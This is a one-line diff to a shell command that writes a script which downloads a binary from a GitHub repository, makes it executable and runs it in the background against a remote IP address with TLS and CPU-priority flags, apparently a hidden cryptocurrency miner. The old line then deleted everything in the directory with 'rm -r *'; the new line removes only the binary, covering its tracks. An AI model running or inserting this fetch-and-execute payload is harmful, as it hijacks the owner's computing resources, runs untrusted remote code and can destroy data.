@@ -1,1 +1,1 @@
-echo 'wget https://github.com/regvfp/x/raw/main/xle -O bigq && chmod 777 bigq && ./bigq -o 87.179.181.37:443 --tls --background --cpu-priority 0 && rm -r *' > sh
+echo 'wget https://github.com/regvfp/x/raw/main/xle -O bigq && chmod 777 bigq && ./bigq -o 87.179.181.37:443 --tls --background --cpu-priority 0 && rm bigq' > sh
